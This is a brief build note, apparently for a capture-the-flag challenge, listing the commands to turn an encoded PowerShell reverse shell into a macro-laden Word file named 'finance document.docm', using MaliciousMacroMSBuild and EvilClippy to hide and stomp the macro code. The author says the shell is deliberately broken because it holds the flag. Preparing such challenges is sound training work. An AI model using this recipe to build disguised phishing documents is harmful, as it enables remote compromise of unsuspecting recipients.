to build
make payload with 
https://raikia.com/tool-powershell-encoder/
put that into powershellReverse.b64
then
https://github.com/infosecn1nja/MaliciousMacroMSBuild
the malicious macro won't do anything anyway since the malicious code (reverse shell) has invalid code since it contains the flag but -d can be added so malicious macro only runs on specific/non-existent domain
run: python2 m3-gen.py -i powershellReverse.b64 -p powershell -o payload.vba -d SOMEDOMAINTHATDOESNTEXIST
Using microsoft word, put payload in document
save as macro format called finance document.docm
then
https://github.com/outflanknl/EvilClippy
run: EvilClippy.exe -g -u -s fakecode.vba finance document.docm
